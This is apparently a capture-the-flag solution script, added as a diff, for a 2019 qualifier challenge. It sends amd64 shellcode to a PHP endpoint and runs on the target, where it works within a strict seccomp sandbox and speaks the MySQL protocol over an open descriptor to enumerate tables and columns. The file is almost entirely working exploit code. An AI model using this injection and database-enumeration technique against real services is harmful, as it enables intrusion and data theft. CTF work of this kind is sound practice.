@@ -1,0 +1,60 @@
+#!/usr/bin/env python2
+from pwn import *
+import requests
+import time
+
+"""
+* will execute our shellcode
+* only read/write due to prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT)
+* have to return valid HTTP response otherwise will get 500
+* can query the db using fd 4 
+"""
+
+def parse(s):
+    s = s.split('/html>')[1][5:]
+    out = []
+    skip = 0
+    for i in xrange(len(s)):
+        if skip > 0:
+            skip -= 1
+            continue
+        temp = ""
+        good = True
+        last = 0
+        if not ord(s[i]) < 100:
+            continue
+        pls = s[i+1:i+ord(s[i])+1]
+        for j in pls:
+            if not (ord(j) >= 0x20 and ord(j) <= 0x7f):
+                good = False
+        if good:
+            skip = ord(s[i])
+            out.append(pls)
+        else:
+            continue
+    return out
+
+for i in xrange(1000):
+
+    context.arch = "amd64"
+    context.os = "linux"
+
+    host = "http://shellretql.quals2019.oooverflow.io:9090/cgi-bin/"
+    html = """X-Powered-By: PHP/7.0.28-0ubuntu0.16.04.1\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n<html><body>Hello World!</body></html>"""
+
+    #query = "select table_name, table_schema from information_schema.tables where table_schema!='shellql' and table_schema!='information_schema' limit 1 offset {};".format(i)
+    query = "select column_name from information_schema.columns where table_schema='shellql' and table_name='PokerTable' limit 1 offset {};".format(i)
+    #query = "select Name from Players where 1=1 limit 1 offset {};".format(i)
+
+    shellcode = ""
+    shellcode += shellcraft.echo(p16(len(query)) + "\x00\x00\x03" + query , 4)
+    shellcode += shellcraft.read(4, 'rsp', 200)
+    shellcode += shellcraft.pushstr(html)
+    shellcode += shellcraft.write(1, 'rsp', 500)
+
+    data = {
+        "shell": asm(shellcode) + "\x00"
+    }
+
+    resp = requests.post(host + "index.php", data=data)
+    print parse(resp.text.replace('\x00',''))
